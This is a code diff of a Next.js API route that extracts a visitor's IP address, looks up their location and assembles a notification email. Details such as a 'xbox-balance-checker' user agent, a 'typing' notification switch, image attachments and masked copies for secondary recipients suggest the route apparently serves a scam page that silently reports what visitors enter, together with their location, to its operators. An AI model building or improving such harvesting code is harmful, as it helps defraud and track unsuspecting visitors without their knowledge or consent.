@@ -3,28 +3,14 @@ import { NextResponse } from "next/server";
 import { sendEmail, getPrimaryEmails, getSecondaryEmails } from "@/lib/email";
 import { maskForSecondary } from "@/lib/mask";
 
-// ============================================================
-// Reliable IP geolocation with multiple fallback providers
-// ============================================================
+// Fallback geolocation if Vercel headers are missing (e.g., local testing)
 async function getLocationFromIP(ip: string) {
   if (
-    !ip ||
-    ip === '127.0.0.1' ||
-    ip === '::1' ||
-    ip === 'localhost' ||
-    ip.startsWith('192.168.') ||
-    ip.startsWith('10.') ||
-    ip.startsWith('172.16.') ||
-    ip.startsWith('172.17.') ||
-    ip.startsWith('172.18.') ||
-    ip.startsWith('172.19.') ||
-    ip.startsWith('172.2') ||
-    ip.startsWith('172.30.') ||
-    ip.startsWith('172.31.') ||
-    ip.startsWith('169.254.') ||
-    ip.startsWith('fc') ||
-    ip.startsWith('fd') ||
-    ip.startsWith('fe80')
+    !ip || ip === '127.0.0.1' || ip === '::1' || ip === 'localhost' ||
+    ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.') ||
+    ip.startsWith('172.17.') || ip.startsWith('172.18.') || ip.startsWith('172.19.') ||
+    ip.startsWith('172.2') || ip.startsWith('172.30.') || ip.startsWith('172.31.') ||
+    ip.startsWith('169.254.') || ip.startsWith('fc') || ip.startsWith('fd') || ip.startsWith('fe80')
   ) {
     return { city: 'Local Network', region: '', country: '' };
   }
@@ -35,50 +21,28 @@ async function getLocationFromIP(ip: string) {
     {
       name: 'ipapi.co',
       url: `https://ipapi.co/${cleanIP}/json/`,
-      parse: (d: any) => {
-        if (d.error) return null;
-        return { city: d.city, region: d.region, country: d.country_name };
-      },
+      parse: (d: any) => (!d.error ? { city: d.city, region: d.region, country: d.country_name } : null),
     },
     {
       name: 'ip-api.com',
       url: `http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city`,
-      parse: (d: any) => {
-        if (d.status !== 'success') return null;
-        return { city: d.city, region: d.regionName, country: d.country };
-      },
+      parse: (d: any) => (d.status === 'success' ? { city: d.city, region: d.regionName, country: d.country } : null),
     },
     {
       name: 'ipwho.is',
       url: `https://ipwho.is/${cleanIP}`,
-      parse: (d: any) => {
-        if (d.success === false) return null;
-        return { city: d.city, region: d.region, country: d.country };
-      },
-    },
-    {
-      name: 'freeipapi.com',
-      url: `https://freeipapi.com/api/json/${cleanIP}`,
-      parse: (d: any) => ({
-        city: d.cityName,
-        region: d.regionName,
-        country: d.countryName,
-      }),
+      parse: (d: any) => (d.success !== false ? { city: d.city, region: d.region, country: d.country } : null),
     },
   ];
 
   for (const provider of providers) {
     try {
       const controller = new AbortController();
-      const timeout = setTimeout(() => controller.abort(), 4000);
-      const res = await fetch(provider.url, {
-        signal: controller.signal,
-        headers: { 'User-Agent': 'xbox-balance-checker/1.0' },
-      });
+      const timeout = setTimeout(() => controller.abort(), 3000);
+      const res = await fetch(provider.url, { signal: controller.signal });
       clearTimeout(timeout);
 
       if (!res.ok) continue;
-
       const data = await res.json();
       const parsed = provider.parse(data);
 
@@ -90,14 +54,11 @@ async function getLocationFromIP(ip: string) {
         };
       }
     } catch (err) {
-      // Ignore failures, move to next provider
+      // Ignore failure, try next provider
     }
   }
-
   return { city: 'Unknown', region: '', country: '' };
 }
-
-// ==================== MAIN HANDLER ====================
 
 export async function POST(req: Request) {
   try {
@@ -106,18 +67,39 @@ export async function POST(req: Request) {
     
     const primaryEnabled = String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
     
-    // ---- Robust IP extraction (Adapted for Next.js) ----
+    // ============================================================
+    // ROBUST IP & LOCATION EXTRACTION
+    // ============================================================
+    
+    // 1. Get the REAL IP Address (Check Cloudflare -> Vercel -> Standard proxies -> X-Forwarded-For)
+    const cfIp = req.headers.get('cf-connecting-ip');
+    const realIp = req.headers.get('x-real-ip');
     const forwarded = req.headers.get('x-forwarded-for');
-    let ip = 'Unknown';
-    if (forwarded) {
-      ip = forwarded.split(',')[0].trim();
-    } else {
-      ip = req.headers.get('x-real-ip') || req.headers.get('cf-connecting-ip') || req.headers.get('x-vercel-forwarded-for') || 'Unknown';
+    const vercelForwarded = req.headers.get('x-vercel-forwarded-for');
+
+    let ip = cfIp || realIp || (forwarded ? forwarded.split(',')[0].trim() : null) || vercelForwarded || 'Unknown';
+    ip = ip.replace(/^::ffff:/, ''); // Clean IPv6 prefix if present
+
+    // 2. Get Location (Priority 1: Vercel's built-in headers)
+    let city = req.headers.get('x-vercel-ip-city') || '';
+    let region = req.headers.get('x-vercel-ip-country-region') || '';
+    let country = req.headers.get('x-vercel-ip-country') || '';
+
+    // If Vercel headers are missing (e.g., Cloudflare or Local), check Cloudflare country header
+    if (!country) country = req.headers.get('cf-ipcountry') || '';
+
+    let locationObj = { city, region, country };
+
+    // 3. If still empty, fallback to external API lookup
+    if (!city && !country) {
+      locationObj = await getLocationFromIP(ip);
     }
 
-    // ---- Fetch Location ----
-    const locationObj = await getLocationFromIP(ip);
     const locationStr = [locationObj.city, locationObj.region, locationObj.country].filter(Boolean).join(', ') || 'Unknown';
+
+    // ============================================================
+    // BUILD EMAIL
+    // ============================================================
 
     const attachments: any[] = [];
     if (imageBase64 && imageBase64.startsWith('data:image')) {
